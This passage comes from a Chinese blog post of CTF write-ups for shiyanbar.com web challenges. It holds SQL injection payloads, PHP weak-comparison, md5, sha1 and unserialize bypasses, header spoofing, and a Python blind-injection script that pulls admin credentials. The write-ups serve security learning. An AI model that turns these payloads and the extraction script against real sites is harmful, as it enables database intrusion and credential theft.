+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>'<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span>table_name<span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.tables%<span class="number">23</span></span><br><span class="line">?id=<span class="number">-1</span>'<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span>column_name<span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="built_in">where</span><span class="comment">/**/</span>table_name='flag'%<span class="number">23</span></span><br><span class="line">?id=<span class="number">-1</span>'<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span>flag<span class="comment">/**/</span>from<span class="comment">/**/</span>flag%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+<h1 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单"></a>这个看起来有点简单</h1><p>很常规的一套操作</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf5.shiyanbar.com/8/<span class="keyword">index</span>.php?id=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>
+<p>后面的省略</p>
+<h1 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h1><p>查看元素即可得到源码，这是基础，源码位置在 <code>source.txt</code> 。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123;   </span><br><span class="line">        <span class="keyword">print</span> <span class="string">"姘村彲杞借垷锛屼害鍙禌鑹囷紒"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$con)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db=<span class="string">"XXXXXX"</span>;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"浜﹀彲璧涜墖锛�"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"涓€棰楄禌鑹囷紒"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>关键代码如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;<span class="variable">$_POST</span>['uname']&#125;'"</span>;</span><br><span class="line"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>); </span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows(<span class="variable">$query</span>) == 1) &#123; </span><br><span class="line">    <span class="variable">$key</span> = mysql_fetch_array(<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>[<span class="string">'pwd'</span>] == <span class="variable">$_POST</span>[<span class="string">'pwd'</span>]) &#123;</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"浜﹀彲璧涜墖锛�"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一道绕过要求必须返回结果切值返回一行结果，可以考虑limit，由于逗号也被过滤了，故可以使用offset来控制返回的结果个数，例如：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">username</span>=<span class="string">''</span> <span class="keyword">or</span> <span class="attribute">1</span>=1 limit 1 offset 0</span><br></pre></td></tr></table></figure>
+<p>但是这里第二道过滤要求提交的密码和数据库中的对应的密码相同，这个就困难了，因为我们并不知道数据库中的pwd字段值，所以这个时候看了别的大佬想到了rollup，说来惭愧，这个我之前学习SQL的时候还专门看过，结果在这题却没有想到，哎，真的是菜鸡，为什么可以用rollup原理可以在我的博客中《SQL学习笔记三》中找到，原理就是使用rollup子句会多产生一个汇总行，如果我们没有指定聚合函数，那么它的值就会是NULL，rollup子句是和group by子句一起使用的，只会在group指定的列中产生汇总行，那么就可尝试构造payload了</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=uname=' <span class="keyword">or</span> <span class="attribute">1</span>=1<span class="built_in"> group </span>by pwd with rollup limit 1 offset 2#&amp;pwd=</span><br></pre></td></tr></table></figure>
+<p>这里通过更改offset后面的数字值来使数据库返回有NULL的那一行即可，至于pwd值可以利用PHP弱比较，空字符与NULL相比较会返回true，所以我们pwd不传参即可是比较返回true。</p>
+<p>注意：这题用的rollup子句我在自己的数据库上试了之后发现不行，原因在于sql_mode的设置，查看一下数据库的该值</p>
+<blockquote>
+<p>Variable_name | Value<br>sql_mode       | ONLY_FULL_GROUP_BY,STRICT_ALL_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER</p>
+</blockquote>
+<p>默认会设置有 <font face="futura">ONLY_FULL_GROUP_BY</font>这个模式，此时group by子句中必须包含所查询的所有列，具体的信息可以查看我的之前那篇博客，这是默认开启的，而此题目该模式应该是关闭的，运行命令</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> GLOBAL <span class="attribute">sql_mode</span>=<span class="string">'TRICT_ALL_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER'</span></span><br></pre></td></tr></table></figure>
+<p>如此即可以在自己的数据库上实现相同的效果。</p>
+<h1 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h1><p>查看元素，发现语句</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">test</span>=<span class="variable">$_GET</span>[<span class="string">'username'</span>]; <span class="variable">$test</span>=md5(<span class="variable">$test</span>); <span class="keyword">if</span>(<span class="variable">$test</span>==<span class="string">'0'</span>)</span></span><br></pre></td></tr></table></figure>
+<p>可知是利用md5弱比较，</p>
+<p>故提交username为 <code>s878926199a</code> ,即可得到下一个页面地址，得到如下语句</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">unserialize_str = <span class="variable">$_POST</span>[<span class="string">'password'</span>]; </span></span><br><span class="line"><span class="meta">$</span><span class="bash">data_unserialize = unserialize(<span class="variable">$unserialize_str</span>); </span></span><br><span class="line"><span class="meta">if($</span><span class="bash">data_unserialize[<span class="string">'user'</span>] == <span class="string">'???'</span> &amp;&amp; <span class="variable">$data_unserialize</span>[<span class="string">'pass'</span>]==<span class="string">'???'</span>) &#123; </span></span><br><span class="line"><span class="meta">	print_r($</span><span class="bash">flag); </span></span><br><span class="line">&#125; </span><br><span class="line">伟大的科学家php方言道：成也布尔，败也布尔。 回去吧骚年</span><br></pre></td></tr></table></figure>
+<p>看代码可知是简单的反序列化的应用，但是比较坑的是这儿的user和pass的值是布尔true，因为题目提示了成也布尔，败也布尔（23333）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">a[<span class="string">'user'</span>] = <span class="literal">true</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">a[<span class="string">'pass'</span>] = <span class="literal">true</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">b = serialize(<span class="variable">$a</span>);</span></span><br><span class="line"><span class="meta">print($</span><span class="bash">b);</span></span><br></pre></td></tr></table></figure>
+<p>提交就可以了。</p>
+<h1 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h1><p>代码审计，就是绕过的题目的过来吧就好了</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf5.shiyanbar.<span class="keyword">com</span>/indirection\<span class="built_in">index</span>.php/<span class="built_in">index</span>.php</span><br></pre></td></tr></table></figure>
+<p>关键点就是还是利用\来替换/，尽管题目限制了\，但是在此处并没有受到限制</p>
+<h1 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h1><p>查看元素，发现一段代码</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="attribute">name</span>=<span class="string">"showsource"</span> <span class="attribute">value</span>=<span class="string">"0"</span> <span class="attribute">type</span>=<span class="string">"hidden"</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>直接修改值为1即可查看源代码，然后一波简单操作就得到flag</p>
+<h1 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h1><p>先随便输入个邮箱之后页面会返回跳转链接 <code>step2.php?email=youmail@mail.com&amp;check=???????</code> ,访问发现页面会自动跳转到step1.php，抓包看一下发现关键点</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">form</span> action=<span class="string">"submit.php"</span> method=<span class="string">"GET"</span>&gt;</span><br><span class="line">		&lt;h1&gt;æ¾åå¯ç step2&lt;/h1&gt;</span><br><span class="line">		email:&lt;<span class="keyword">input</span> name=<span class="string">"emailAddress"</span> <span class="keyword">type</span>=<span class="string">"text"</span> &lt;<span class="keyword">br</span> /&gt;</span><br><span class="line">		value=<span class="string">"youmail@mail.com"</span>  disable=<span class="string">"true"</span>/&gt;&lt;/<span class="keyword">br</span>&gt;</span><br><span class="line">		<span class="keyword">token</span>:&lt;<span class="keyword">input</span> name=<span class="string">"token"</span> <span class="keyword">type</span>=<span class="string">"text"</span> /&gt;&lt;/<span class="keyword">br</span>&gt;</span><br><span class="line">		&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"submit"</span> value=<span class="string">"æäº¤"</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">form</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>访问submit.php页面，提示不是admin，在查看抓包内容</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta <span class="attribute">name</span>=<span class="string">"admin"</span> <span class="attribute">content</span>=<span class="string">"admin@simplexue.com"</span> /&gt;</span><br><span class="line">&lt;meta <span class="attribute">name</span>=<span class="string">"editor"</span> <span class="attribute">content</span>=<span class="string">"Vim"</span> /&gt;</span><br></pre></td></tr></table></figure>
+<p>发现是vim编辑器，那么可能是备份文件泄露，访问 .submit.php.swp得到源代码，核心过滤如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br></pre></td></tr></table></figure>
+<p>这个用0e即可绕过，剩下的就是admin的邮箱，前面有一段内容 <code>content=&quot;admin@simplexue.com&quot;</code> 猜测可能就是admin邮箱，提交一下果然可以</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>ctf5.shiyanbar.com<span class="regexp">/10/u</span>pload<span class="regexp">/submit.php?emailAddress=admin@simplexue.com&amp;token=0e00000000</span></span><br></pre></td></tr></table></figure>
+<h1 id="once-more"><a href="#once-more" class="headerlink" title="once more"></a>once more</h1><p>很简单，ereg()函数截断，只在PHP5中才有，注意要在地址栏中提交因为在题目给的输入框中提交会再次url编码</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1e8</span>%<span class="number">00</span>*-*</span><br></pre></td></tr></table></figure>
+<h1 id="Guess-next-session"><a href="#Guess-next-session" class="headerlink" title="Guess next session"></a>Guess next session</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start(); </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_GET[<span class="string">'password'</span>] == $_SESSION[<span class="string">'password'</span>])</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span> (<span class="string">'Flag: '</span>.$flag);</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'&lt;p&gt;Wrong guess.&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">mt_srand((microtime() ^ rand(<span class="number">1</span>, <span class="number">10000</span>)) % rand(<span class="number">1</span>, <span class="number">10000</span>) + rand(<span class="number">1</span>, <span class="number">10000</span>));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>题目最后一行给出的应该是密码的生成逻辑，显然是不可能构造出来的，那么我们可以通过修改session(删除掉对应的sessionid)使 <code>$_SESSION[&#39;password&#39;]</code> 为空，那么我们提交一个空的密码那么在验证时就会有 <code>&#39;&#39;==&#39;&#39;</code> 为true，即可验证通过</p>
+<h1 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>sha1数组绕过即可</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name<span class="string">[]</span>=<span class="number">2</span>&amp;password<span class="string">[]</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h1 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h1><p>查看元素可以看到有个 <code>index.txt</code> ，访问以下得到源码，这里只给出部分</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">	$conn = mysql_connect(<span class="string">"********"</span>, <span class="string">"*****"</span>, <span class="string">"********"</span>);</span><br><span class="line">	mysql_select_db(<span class="string">"phpformysql"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Could not select database"</span>);</span><br><span class="line">	<span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select pw from php where user='$user'"</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> (!$query) &#123;</span><br><span class="line">	printf(<span class="string">"Error: %s\n"</span>, mysql_error($conn));</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line"><span class="comment">//echo $row["pw"];</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>分析题目逻辑，先是将输入的密码值md5变换一下，在数据中查询与用户名相等的用户名并提取结果，然后用返回结果对应的密码字段和刚昂MD5变换后的字段比较，如果相等则成功返回flag，我刚开始想思路放在strcasecmp()函数上，思路并不对。这题的突破口在于sql语句，我们可以尝试sql注入，尝试绕过这个user认证字段，即user字段提交</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' <span class="keyword">and</span> <span class="number">0</span>=<span class="number">1</span> <span class="built_in">union</span> <span class="built_in">select</span> 'c4ca4238a0b923820dcc509a6f75849b'<span class="meta">#</span></span><br></pre></td></tr></table></figure>
+<p>那么此时数据库返回的$row[pw]就是输入的这段md5值(1的md5值)，我们只需要在密码字段提交1即可绕过了，最终payload</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=' <span class="keyword">and</span> <span class="number">0</span>=<span class="number">1</span> <span class="built_in">union</span> <span class="built_in">select</span> 'c4ca4238a0b923820dcc509a6f75849b'<span class="meta">#&amp;pass=1</span></span><br></pre></td></tr></table></figure>
+<h1 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h1><p>url二次编码绕过</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="meta">%</span><span class="number">2568</span><span class="meta">%</span><span class="number">2561</span><span class="meta">%</span><span class="number">2563</span><span class="meta">%</span><span class="number">256</span>b<span class="meta">%</span><span class="number">2565</span><span class="meta">%</span><span class="number">2572</span><span class="meta">%</span><span class="number">2544</span><span class="meta">%</span><span class="number">254</span>a</span><br></pre></td></tr></table></figure>
+<h1 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h1><p>简单的x-forwarded-for修改即可</p>
+<h1 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h1><p>先是随便在admin字段尝试（因为admin字段有回显），当输入 <code>admin&#39; and 1=1#</code> 时返回“登录失败，错误的用户名和密码”，而如果输入 <code>admin&#39; and 1=2#</code> 时，则返回“数据库连接错误”！！，所以这儿是一处注入点</p>
+<p>判断数据库长度 <code>admin&#39; and length(database())=4#</code> 可知数据库长度为4，接下来爆库名 <code>?admin=admin&#39; and substr(database(),1,3)=&#39;tes&#39;%23&amp;pass=12456&amp;action=login</code> ,数据库名是 <code>test</code> </p>
+<p>盲注脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin' and "</span></span><br><span class="line">dic = <span class="string">',1234567890()qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@'</span></span><br><span class="line"><span class="comment"># payload = "substr((Select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;'%23&amp;pass=12456&amp;action=login"</span></span><br><span class="line">yes = <span class="string">'错误'</span></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">table_name = <span class="string">''</span>  <span class="comment"># admin</span></span><br><span class="line">column_name = <span class="string">''</span> <span class="comment"># username,password</span></span><br><span class="line"><span class="comment"># payload = "substr((Select group_concat(column_name) from information_schema.columns where table_name='admin'),&#123;&#125;,1)='&#123;&#125;'%23&amp;pass=12456&amp;action=login"</span></span><br><span class="line">payload = <span class="string">"substr((Select group_concat(username,password) from admin),&#123;&#125;,1)='&#123;&#125;'%23&amp;pass=12456&amp;action=login"</span></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">True</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">		res = requests.get(url + payload.format(str(length),i)).text.encode(<span class="string">'latin-1'</span>).decode(<span class="string">'gb2312'</span>)</span><br><span class="line">		<span class="keyword">if</span> yes <span class="keyword">in</span> res:</span><br><span class="line">			<span class="comment"># table_name += i</span></span><br><span class="line">			column_name += i</span><br><span class="line">			length += <span class="number">1</span></span><br><span class="line">			print(column_name)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> i == <span class="string">'@'</span>:</span><br><span class="line">			print(<span class="string">'aaaaaaaaaaaaaaaaaaaaaa'</span>)</span><br><span class="line"><span class="comment"># admin,idnuenna</span></span><br></pre></td></tr></table></figure>
+<h1 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h1><p>脑洞题，注意题目响应头 <code>Content-Row: MTUyODYyMjkxMQ==</code> 直接把这个内容提交验证即可。。</p>
+<h1 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h1><p>打开后看到有如下要求</p>
+<blockquote>
+<p>You don’t have permission to access / on this server.<br>Please make sure you have installed .net framework 9.9!<br>Make sure you are in the region of England and browsing this site with Internet Explorer</p>
+</blockquote>
+<p>第一个本题好像实际上并没有限制，第二个可以通过修改user-agent字段，修改为</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 9.9; .NET CLR 3.5.30729; rv:11.0)</span> like Geckog</span><br></pre></td></tr></table></figure>
+<p>第三个要求来自英国，可以通过修改accept-language字段的值</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">en-gb;<span class="attribute">q</span>=0.8</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+  <div>
+    
+      <div>
+    
+        <div style="text-align:center;color: #4b4b4b;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+    
+  </div>
+
+    
+
+    
+      
+    
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您今天怎么辣么迷人！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/reward-wechat.png" alt="新城瑞雪 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/reward-alipay.jpg" alt="新城瑞雪 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>新城瑞雪</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
